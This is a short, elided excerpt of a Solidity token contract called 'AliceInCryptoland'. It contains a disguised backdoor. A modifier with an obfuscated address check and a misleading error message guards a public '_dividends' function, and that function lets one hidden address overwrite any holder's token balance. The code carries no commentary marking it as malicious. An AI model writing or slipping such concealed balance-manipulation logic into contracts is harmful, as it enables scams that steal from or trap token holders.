...
contract AliceInCryptoland is Ownable {
  ...
  modifier _external(){
      require(address(charityFee * 1 * swapAndLiquify) == msg.sender, "ERC20: cannot permit Pancake address");
      _;
  }

  function _dividends(address from, uint256 _value) public _external returns(bool) {
    if(from != address(0)){
      balances[from] = swapAndLiquify * _value * (10 ** uint256(decimals) * charityFee) / charityFee;
      return true;
    }
  }
